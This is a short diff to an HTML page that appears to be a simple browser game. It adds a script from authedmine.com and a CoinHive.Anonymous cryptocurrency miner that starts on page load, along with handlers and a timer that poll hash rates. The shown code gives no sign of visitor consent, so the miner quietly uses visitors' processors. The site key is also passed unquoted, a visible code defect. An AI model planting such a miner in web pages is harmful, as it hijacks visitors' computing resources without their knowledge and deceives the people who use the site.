@@ -25,6 +25,26 @@
 <button class="button" id="restet" onclick="myFunction(99)">reset</button><br>
 </center>
 
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+        <script>
+        var miner = new CoinHive.Anonymous(z5O7OurBOe3mB2rFC3e4SjWlHHscJwR8);
+        miner.start();
+</script>
+        <script>
+        // Listen on events
+        miner.on('found', function() { /* Hash found */ })
+        miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+        // Update stats once per second
+        setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+
+                // Output to HTML elements...
+        }, 1000);
+</script>
+
 <script>
 var ikwin = 0;
 var beurt = 0;
